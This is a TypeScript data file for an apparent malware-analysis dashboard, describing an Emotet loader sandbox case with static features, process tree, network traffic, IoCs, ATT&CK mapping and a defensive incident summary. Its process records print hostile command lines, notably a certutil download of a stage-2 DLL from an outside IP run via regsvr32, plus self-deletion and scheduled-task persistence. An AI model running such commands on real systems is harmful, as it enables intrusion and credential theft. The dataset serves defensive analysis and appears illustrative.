import type {
  StaticAnalysis,
  DynamicAnalysis,
  NetworkAnalysis,
  ThreatIntelSource,
  IoC,
  MitreTechnique,
  AiInvestigation,
} from "./types";

/* ══════════════════════════════════════════════════════════════════════════
   Deep-dive analysis dataset for the featured case AGS-2026-0412 (Emotet).
   Every analysis page renders from these structures.
   ════════════════════════════════════════════════════════════════════════ */

export const staticAnalysis: StaticAnalysis = {
  entropy: 7.42,
  compiler: "Microsoft Visual C/C++ (2019 v16.x)",
  packer: "Custom loader stub (partial UPX-like)",
  arch: "x86 (32-bit)",
  subsystem: "Windows GUI",
  timestamp: "2026-07-24 03:11:57 UTC",
  imphash: "f34d5f2d4577ed6d9ceec516c1f5a744",
  signatureStatus: "invalid",
  capabilities: [
    "Process injection (VirtualAllocEx / WriteProcessMemory)",
    "Anti-analysis / sandbox evasion checks",
    "Registry Run-key persistence",
    "HTTP(S) C2 communication",
    "Credential & email harvesting",
    "Dynamic API resolution (GetProcAddress)",
  ],
  sections: [
    { name: ".text", virtualSize: 212_992, rawSize: 213_504, entropy: 6.58, flags: "R-X", suspicious: false },
    { name: ".rdata", virtualSize: 61_440, rawSize: 61_952, entropy: 5.11, flags: "R--", suspicious: false },
    { name: ".data", virtualSize: 40_960, rawSize: 8_704, entropy: 4.82, flags: "RW-", suspicious: false },
    { name: ".rsrc", virtualSize: 24_576, rawSize: 24_576, entropy: 7.91, flags: "R--", suspicious: true },
    { name: ".xtxt", virtualSize: 143_360, rawSize: 143_872, entropy: 7.98, flags: "RWX", suspicious: true },
  ],
  imports: [
    {
      dll: "KERNEL32.dll",
      functions: ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "GetProcAddress", "LoadLibraryA", "CreateProcessA", "IsDebuggerPresent", "GetTickCount"],
      suspicious: ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "IsDebuggerPresent"],
    },
    {
      dll: "WININET.dll",
      functions: ["InternetOpenA", "InternetConnectA", "HttpOpenRequestA", "HttpSendRequestA", "InternetReadFile"],
      suspicious: ["HttpSendRequestA", "InternetConnectA"],
    },
    {
      dll: "ADVAPI32.dll",
      functions: ["RegCreateKeyExA", "RegSetValueExA", "CryptAcquireContextA", "CryptEncrypt", "OpenProcessToken"],
      suspicious: ["RegSetValueExA", "CryptEncrypt"],
    },
    {
      dll: "CRYPT32.dll",
      functions: ["CryptStringToBinaryA", "CryptUnprotectData"],
      suspicious: ["CryptUnprotectData"],
    },
  ],
  strings: [
    { value: "http://185.220.101.47/gate.php", type: "url", offset: "0x0004A21C", interesting: true },
    { value: "https://finance-docsecure[.]com/wp-content/uploads/8x3/", type: "url", offset: "0x0004A2F0", interesting: true },
    { value: "185.220.101.47", type: "ip", offset: "0x0004A400", interesting: true },
    { value: "Global\\M_9f2c4e8b", type: "mutex", offset: "0x0004B118", interesting: true },
    { value: "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", type: "registry", offset: "0x0004B220", interesting: true },
    { value: "%APPDATA%\\Microsoft\\Windows\\certutil.exe", type: "path", offset: "0x0004B3A0", interesting: true },
    { value: "cmd.exe /c ping 127.0.0.1 -n 6 > nul & del", type: "command", offset: "0x0004B500", interesting: true },
    { value: "CryptUnprotectData", type: "api", offset: "0x0004B610", interesting: true },
    { value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", type: "generic", offset: "0x0004B700", interesting: false },
    { value: "SELECT * FROM logins", type: "command", offset: "0x0004B840", interesting: true },
  ],
  yara: [
    {
      rule: "Emotet_Loader_v5",
      description: "Detects Emotet loader stub and RWX unpacking section layout",
      severity: "critical",
      tags: ["emotet", "loader", "banker"],
      author: "AegisIntel Research",
    },
    {
      rule: "SUSP_Process_Injection_APIs",
      description: "Classic CreateRemoteThread process injection triad",
      severity: "high",
      tags: ["injection", "evasion"],
      author: "AegisIntel Research",
    },
    {
      rule: "SUSP_AntiDebug_Checks",
      description: "IsDebuggerPresent + timing-based anti-analysis",
      severity: "medium",
      tags: ["anti-analysis"],
      author: "Florian Roth (adapted)",
    },
    {
      rule: "Credential_Access_Browser_DB",
      description: "References browser credential SQLite stores and DPAPI",
      severity: "high",
      tags: ["credential-access", "stealer"],
      author: "AegisIntel Research",
    },
  ],
};

export const dynamicAnalysis: DynamicAnalysis = {
  vmName: "AGS-SBX-07",
  os: "Windows 10 Pro 22H2 (x64)",
  detonationTime: 180,
  screenshotFrames: 12,
  processes: [
    { pid: 4128, ppid: 3820, name: "Invoice_scan_04829.exe", commandLine: '"C:\\Users\\analyst\\Desktop\\Invoice_scan_04829.exe"', integrity: "Medium", suspicious: true, startOffset: 2 },
    { pid: 4180, ppid: 4128, name: "certutil.exe", commandLine: "certutil.exe -urlcache -split -f http://185.220.101.47/p.dll", integrity: "Medium", suspicious: true, startOffset: 11 },
    { pid: 4224, ppid: 4128, name: "regsvr32.exe", commandLine: "regsvr32.exe /s %APPDATA%\\Microsoft\\Windows\\certutil.exe", integrity: "Medium", suspicious: true, startOffset: 19 },
    { pid: 4260, ppid: 4128, name: "explorer.exe", commandLine: "C:\\Windows\\explorer.exe [injected]", integrity: "Medium", suspicious: true, startOffset: 27 },
    { pid: 4312, ppid: 4224, name: "cmd.exe", commandLine: "cmd.exe /c ping 127.0.0.1 -n 6 > nul & del Invoice_scan_04829.exe", integrity: "Medium", suspicious: true, startOffset: 41 },
    { pid: 4360, ppid: 4260, name: "schtasks.exe", commandLine: 'schtasks /create /tn "MicrosoftEdgeUpdateTaskCore" /tr ... /sc minute /mo 20', integrity: "High", suspicious: true, startOffset: 55 },
  ],
  timeline: [
    { offset: 2, category: "process", action: "Process created", detail: "Invoice_scan_04829.exe launched from Desktop", severity: "info", mitre: "T1204" },
    { offset: 4, category: "evasion", action: "Anti-analysis check", detail: "IsDebuggerPresent + GetTickCount timing loop executed", severity: "medium", mitre: "T1497" },
    { offset: 6, category: "process", action: "Memory unpacked", detail: "RWX region allocated, .xtxt decrypted in-memory", severity: "high", mitre: "T1027" },
    { offset: 11, category: "network", action: "C2 beacon", detail: "certutil downloads stage-2 from 185.220.101.47/p.dll", severity: "critical", mitre: "T1105" },
    { offset: 19, category: "process", action: "Payload executed", detail: "regsvr32 loads downloaded module", severity: "critical", mitre: "T1218" },
    { offset: 27, category: "process", action: "Process injection", detail: "Code injected into explorer.exe via CreateRemoteThread", severity: "critical", mitre: "T1055" },
    { offset: 33, category: "registry", action: "Persistence set", detail: "Run key created for %APPDATA%\\...\\certutil.exe", severity: "high", mitre: "T1547" },
    { offset: 41, category: "file", action: "Self-delete", detail: "Original binary deleted after ping-delay", severity: "medium", mitre: "T1070" },
    { offset: 48, category: "network", action: "C2 handshake", detail: "HTTPS POST to finance-docsecure[.]com (encrypted)", severity: "critical", mitre: "T1071" },
    { offset: 55, category: "persistence", action: "Scheduled task", detail: "MicrosoftEdgeUpdateTaskCore recurring every 20 min", severity: "high", mitre: "T1053" },
    { offset: 62, category: "evasion", action: "Credential access", detail: "CryptUnprotectData used against browser DPAPI blobs", severity: "critical", mitre: "T1555" },
    { offset: 71, category: "network", action: "Data exfiltration", detail: "Harvested data POSTed to C2 (multipart, 42 KB)", severity: "critical", mitre: "T1041" },
  ],
  registry: [
    { operation: "create", key: "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", value: "EdgeUpdateCore", data: "%APPDATA%\\Microsoft\\Windows\\certutil.exe", persistence: true },
    { operation: "modify", key: "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa", value: "DisableRestrictedAdmin", data: "0x00000001", persistence: false },
    { operation: "create", key: "HKCU\\SOFTWARE\\Classes\\CLSID\\{9f2c-...}\\InprocServer32", data: "payload path", persistence: true },
    { operation: "query", key: "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid", persistence: false },
    { operation: "modify", key: "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", value: "ProxyEnable", data: "0x00000000", persistence: false },
  ],
  files: [
    { operation: "create", path: "%APPDATA%\\Microsoft\\Windows\\certutil.exe", detail: "Stage-2 payload (masquerades as legit utility)", suspicious: true },
    { operation: "write", path: "%TEMP%\\p.dll", detail: "Downloaded module (7.9 MB, high entropy)", suspicious: true },
    { operation: "create", path: "%APPDATA%\\...\\config.dat", detail: "Encrypted C2 configuration blob", suspicious: true },
    { operation: "delete", path: "%USERPROFILE%\\Desktop\\Invoice_scan_04829.exe", detail: "Original sample self-deleted", suspicious: true },
    { operation: "read", path: "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data", detail: "Browser credential store accessed", suspicious: true },
  ],
  mutexes: ["Global\\M_9f2c4e8b", "Global\\EmotetMainMutex_x86", "Local\\{A1B2C3D4-...}"],
  persistence: [
    { technique: "Registry Run Key", location: "HKCU\\...\\CurrentVersion\\Run\\EdgeUpdateCore", mitre: "T1547.001" },
    { technique: "Scheduled Task", location: "\\MicrosoftEdgeUpdateTaskCore (every 20 min)", mitre: "T1053.005" },
    { technique: "COM Hijack", location: "HKCU\\Software\\Classes\\CLSID\\{9f2c-...}", mitre: "T1546.015" },
  ],
  apiCalls: [
    { category: "Process / Injection", api: "VirtualAllocEx", count: 6, suspicious: true },
    { category: "Process / Injection", api: "WriteProcessMemory", count: 14, suspicious: true },
    { category: "Process / Injection", api: "CreateRemoteThread", count: 3, suspicious: true },
    { category: "Network", api: "HttpSendRequestA", count: 28, suspicious: true },
    { category: "Network", api: "InternetReadFile", count: 41, suspicious: true },
    { category: "Registry", api: "RegSetValueExA", count: 9, suspicious: true },
    { category: "Crypto", api: "CryptUnprotectData", count: 12, suspicious: true },
    { category: "Evasion", api: "IsDebuggerPresent", count: 4, suspicious: true },
    { category: "Filesystem", api: "CreateFileA", count: 63, suspicious: false },
    { category: "Filesystem", api: "DeleteFileA", count: 7, suspicious: true },
  ],
};

export const networkAnalysis: NetworkAnalysis = {
  totalPackets: 4218,
  totalBytes: 1_842_112,
  dns: [
    { domain: "finance-docsecure.com", type: "A", response: "185.220.101.47", malicious: true, category: "C2 / Malware" },
    { domain: "cdn-analytics-track.net", type: "A", response: "45.133.216.12", malicious: true, category: "C2 / Payload host" },
    { domain: "api.ipify.org", type: "A", response: "104.26.13.205", malicious: false, category: "IP-check (recon)" },
    { domain: "www.microsoft.com", type: "A", response: "23.55.0.1", malicious: false, category: "Legitimate (decoy)" },
    { domain: "mail-relay-secure.ru", type: "A", response: "91.207.183.9", malicious: true, category: "Exfiltration" },
  ],
  http: [
    { method: "GET", host: "185.220.101.47", uri: "/gate.php?id=9f2c4e8b", status: 200, scheme: "http", contentType: "application/octet-stream", suspicious: true },
    { method: "GET", host: "185.220.101.47", uri: "/p.dll", status: 200, scheme: "http", contentType: "application/x-msdownload", suspicious: true },
    { method: "POST", host: "finance-docsecure.com", uri: "/wp-content/uploads/8x3/", status: 200, scheme: "https", contentType: "multipart/form-data", suspicious: true },
    { method: "GET", host: "api.ipify.org", uri: "/", status: 200, scheme: "https", contentType: "text/plain", suspicious: false },
    { method: "POST", host: "mail-relay-secure.ru", uri: "/upload", status: 200, scheme: "https", contentType: "application/octet-stream", suspicious: true },
  ],
  connections: [
    { protocol: "TCP", destIp: "185.220.101.47", destPort: 80, country: "Russia", countryCode: "RU", city: "Moscow", lat: 55.75, lon: 37.62, asn: "AS49505", org: "Selectel", bytes: 812_432, malicious: true, role: "Primary C2 / Payload host" },
    { protocol: "TCP", destIp: "45.133.216.12", destPort: 443, country: "Netherlands", countryCode: "NL", city: "Amsterdam", lat: 52.37, lon: 4.9, asn: "AS202425", org: "IP Volume", bytes: 421_008, malicious: true, role: "Secondary C2 (HTTPS)" },
    { protocol: "TCP", destIp: "91.207.183.9", destPort: 443, country: "Russia", countryCode: "RU", city: "Saint Petersburg", lat: 59.93, lon: 30.34, asn: "AS56694", org: "Mks Net", bytes: 214_880, malicious: true, role: "Exfiltration endpoint" },
    { protocol: "TCP", destIp: "104.26.13.205", destPort: 443, country: "United States", countryCode: "US", city: "San Francisco", lat: 37.77, lon: -122.42, asn: "AS13335", org: "Cloudflare", bytes: 18_204, malicious: false, role: "Public IP recon" },
    { protocol: "TCP", destIp: "23.55.0.1", destPort: 443, country: "United States", countryCode: "US", city: "Cambridge", lat: 42.37, lon: -71.1, asn: "AS8075", org: "Microsoft", bytes: 9_120, malicious: false, role: "Decoy / benign traffic" },
  ],
  packetTimeline: Array.from({ length: 36 }, (_, i) => {
    const spike = i === 6 || i === 9 || i === 14 || i === 24;
    return {
      t: i * 5,
      outbound: Math.round((spike ? 180 : 30) + Math.random() * 40),
      inbound: Math.round((i >= 6 && i <= 12 ? 220 : 25) + Math.random() * 30),
    };
  }),
};

export const threatIntel: ThreatIntelSource[] = [
  { source: "VirusTotal", verdict: "61 / 72 engines flag as malicious", score: 61, detail: "First seen 2026-07-24. Detected as Trojan.Emotet by Kaspersky, Microsoft, ESET, CrowdStrike, +57.", link: "https://www.virustotal.com/", lastSeen: "2 hours ago", tone: "danger" },
  { source: "AlienVault OTX", verdict: "Linked to 4 active pulses", score: 92, detail: "Associated with 'Emotet Epoch5 Resurgence' pulse. 1,240 related indicators. Actor: TA542 (Mummy Spider).", link: "https://otx.alienvault.com/", lastSeen: "38 minutes ago", tone: "danger" },
  { source: "AbuseIPDB", verdict: "185.220.101.47 — 100% abuse confidence", score: 100, detail: "Reported 847 times in 90 days. Categories: Malware C2, Port Scan, Brute-Force. ISP: Selectel (RU).", link: "https://www.abuseipdb.com/", lastSeen: "12 minutes ago", tone: "danger" },
  { source: "MITRE ATT&CK", verdict: "Maps to 8 techniques across 6 tactics", score: 80, detail: "Software S0367 (Emotet). Attributed to G0092 (TA542). Full kill-chain from delivery to exfiltration.", link: "https://attack.mitre.org/software/S0367/", lastSeen: "Reference", tone: "warn" },
  { source: "CVE / NVD", verdict: "No direct CVE — behavioural loader", score: 0, detail: "Emotet historically drops modules exploiting CVE-2017-0199 / CVE-2021-40444. Monitor for follow-on payloads.", link: "https://nvd.nist.gov/", lastSeen: "Reference", tone: "neutral" },
  { source: "Hybrid Analysis", verdict: "Threat score 100/100 — Malicious", score: 100, detail: "Sandbox verdict matches. 14 malicious indicators, 9 suspicious. Family confidence: Emotet (high).", link: "https://www.hybrid-analysis.com/", lastSeen: "1 hour ago", tone: "danger" },
];

export const iocs: IoC[] = [
  { type: "hash", value: "9f2c4e8b1a7d5f3c...9a0d2f4e (SHA256)", context: "Primary sample", severity: "critical" },
  { type: "hash", value: "44d88612fea8a8f36de82e1278abb02f (MD5)", context: "Primary sample", severity: "critical" },
  { type: "ip", value: "185.220.101.47", context: "Primary C2 / payload host (RU)", severity: "critical" },
  { type: "ip", value: "45.133.216.12", context: "Secondary C2 over HTTPS (NL)", severity: "high" },
  { type: "ip", value: "91.207.183.9", context: "Exfiltration endpoint (RU)", severity: "high" },
  { type: "domain", value: "finance-docsecure[.]com", context: "C2 HTTPS handshake", severity: "critical" },
  { type: "domain", value: "cdn-analytics-track[.]net", context: "Payload distribution", severity: "high" },
  { type: "domain", value: "mail-relay-secure[.]ru", context: "Data exfiltration", severity: "high" },
  { type: "url", value: "http://185.220.101.47/gate.php", context: "C2 gate / check-in", severity: "critical" },
  { type: "mutex", value: "Global\\M_9f2c4e8b", context: "Single-instance mutex", severity: "medium" },
  { type: "registry", value: "HKCU\\...\\Run\\EdgeUpdateCore", context: "Persistence Run key", severity: "high" },
  { type: "filename", value: "%APPDATA%\\Microsoft\\Windows\\certutil.exe", context: "Masqueraded stage-2 payload", severity: "high" },
];

export const mitreTechniques: MitreTechnique[] = [
  { id: "T1566", name: "Phishing", tactic: "Initial Access", severity: "high", description: "Delivered via malicious email attachment posing as an invoice.", evidence: "Filename 'Invoice_scan_04829.exe', spam-campaign tag" },
  { id: "T1204", name: "User Execution", tactic: "Execution", severity: "high", description: "Requires the victim to run the executable.", evidence: "Process launched from Desktop by user" },
  { id: "T1218", name: "System Binary Proxy Execution", tactic: "Defense Evasion", severity: "high", description: "Abuses certutil.exe and regsvr32.exe to download & run payloads.", evidence: "certutil -urlcache download; regsvr32 /s load" },
  { id: "T1055", name: "Process Injection", tactic: "Defense Evasion", severity: "critical", description: "Injects code into explorer.exe via CreateRemoteThread.", evidence: "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread" },
  { id: "T1547", name: "Boot/Logon Autostart Execution", tactic: "Persistence", severity: "high", description: "Registry Run key ensures execution at logon.", evidence: "HKCU\\...\\Run\\EdgeUpdateCore created" },
  { id: "T1053", name: "Scheduled Task/Job", tactic: "Persistence", severity: "high", description: "Recurring scheduled task every 20 minutes.", evidence: "schtasks MicrosoftEdgeUpdateTaskCore" },
  { id: "T1497", name: "Virtualization/Sandbox Evasion", tactic: "Defense Evasion", severity: "medium", description: "Timing and debugger checks to detect analysis.", evidence: "IsDebuggerPresent + GetTickCount loop" },
  { id: "T1555", name: "Credentials from Password Stores", tactic: "Credential Access", severity: "critical", description: "Steals browser-saved credentials via DPAPI.", evidence: "CryptUnprotectData against Chrome Login Data" },
  { id: "T1071", name: "Application Layer Protocol", tactic: "Command and Control", severity: "critical", description: "HTTP/HTTPS C2 communication.", evidence: "POST to finance-docsecure[.]com" },
  { id: "T1573", name: "Encrypted Channel", tactic: "Command and Control", severity: "high", description: "C2 traffic encrypted to evade inspection.", evidence: "HTTPS handshake, encrypted config blob" },
  { id: "T1041", name: "Exfiltration Over C2 Channel", tactic: "Exfiltration", severity: "critical", description: "Harvested data exfiltrated over the C2 channel.", evidence: "42 KB multipart POST to C2" },
  { id: "T1070", name: "Indicator Removal", tactic: "Defense Evasion", severity: "medium", description: "Self-deletes original binary after execution.", evidence: "cmd ping-delay + del" },
];

// Ordered ATT&CK tactics (kill-chain columns) used by the matrix view
export const mitreTactics = [
  "Initial Access",
  "Execution",
  "Persistence",
  "Defense Evasion",
  "Credential Access",
  "Command and Control",
  "Exfiltration",
];

export const aiInvestigation: AiInvestigation = {
  summary:
    "This sample is a high-confidence Emotet loader — a modular banking trojan and malware-as-a-service dropper. It arrives as an invoice-themed executable, evades analysis, downloads a second-stage payload via living-off-the-land binaries, injects into explorer.exe, establishes multiple persistence mechanisms, harvests browser credentials, and exfiltrates data to Russian and Dutch command-and-control infrastructure. It represents an active foothold with a clear path to follow-on ransomware.",
  family: "Emotet (Epoch 5 / TA542 · Mummy Spider)",
  familyConfidence: 96,
  severity: "critical",
  confidence: 96,
  whatItDoes: [
    "Masquerades as a scanned invoice to lure the user into executing it.",
    "Runs anti-analysis checks (debugger + timing) before unpacking in memory.",
    "Uses certutil.exe and regsvr32.exe (LOLBins) to fetch and run a stage-2 module.",
    "Injects malicious code into explorer.exe to blend into a trusted process.",
    "Installs three persistence mechanisms: Run key, scheduled task, and COM hijack.",
    "Steals saved browser credentials using Windows DPAPI (CryptUnprotectData).",
    "Beacons to C2 servers and exfiltrates ~42 KB of harvested data over HTTPS.",
  ],
  whyDangerous: [
    "Emotet is a known precursor to ransomware (Ryuk, Conti, LockBit) — this is often the first stage of a full-network compromise.",
    "It self-updates and downloads additional modules, so capabilities can expand post-infection.",
    "Credential theft enables lateral movement and account takeover beyond the infected host.",
    "Multiple persistence layers make eradication difficult without a coordinated response.",
    "C2 infrastructure is live and reachable, indicating an active operator.",
  ],
  attackChain: [
    { stage: "Delivery", technique: "Phishing attachment", detail: "Invoice-themed EXE delivered by email spam campaign.", mitre: "T1566" },
    { stage: "Execution", technique: "User runs the file", detail: "Victim double-clicks; in-memory unpacking begins.", mitre: "T1204" },
    { stage: "Evasion", technique: "Anti-analysis + LOLBins", detail: "Sandbox checks, then certutil/regsvr32 proxy execution.", mitre: "T1218" },
    { stage: "Foothold", technique: "Process injection", detail: "Code injected into explorer.exe.", mitre: "T1055" },
    { stage: "Persistence", technique: "Run key + task + COM", detail: "Three independent autostart mechanisms.", mitre: "T1547" },
    { stage: "Collection", technique: "Credential theft", detail: "Browser DPAPI credential harvesting.", mitre: "T1555" },
    { stage: "C2 & Exfil", technique: "Encrypted C2", detail: "Beacon + data exfiltration to RU/NL infra.", mitre: "T1041" },
  ],
  businessImpact: [
    "High risk of follow-on ransomware deployment across the network within hours to days.",
    "Compromise of corporate and personal credentials saved in browsers on the host.",
    "Potential regulatory exposure (GDPR) if exfiltrated data includes personal information.",
    "Likely need for enterprise-wide credential reset and host re-imaging.",
  ],
  recommendations: [
    { priority: "immediate", action: "Isolate the affected host from the network (contain, do not power off — preserve memory)." },
    { priority: "immediate", action: "Block C2 indicators at the firewall/proxy: 185.220.101.47, 45.133.216.12, finance-docsecure[.]com." },
    { priority: "high", action: "Force-reset credentials for any accounts used on the host; prioritise privileged and browser-saved credentials." },
    { priority: "high", action: "Hunt for the IOCs across the estate (Run key, scheduled task, mutex, C2 IPs) — Emotet spreads laterally." },
    { priority: "medium", action: "Re-image the host from a known-good baseline; verify no scheduled tasks or COM hijacks remain." },
    { priority: "medium", action: "Submit blocklist updates to email gateway and enable attachment detonation for inbound EXE/archives." },
  ],
  reasoning: [
    "YARA rule Emotet_Loader_v5 matched the loader stub and RWX unpacking layout with high specificity.",
    "Behavioural chain (LOLBin download → injection → Run-key persistence → DPAPI theft) is textbook Emotet TTPs.",
    "Network indicators correlate with an active AlienVault OTX pulse attributed to TA542 (Mummy Spider).",
    "AbuseIPDB reports 185.220.101.47 at 100% abuse confidence with malware-C2 categorisation.",
    "imphash f34d5f2d... clusters with 1,200+ known Emotet samples in the reference corpus (FAISS similarity 0.94).",
  ],
};
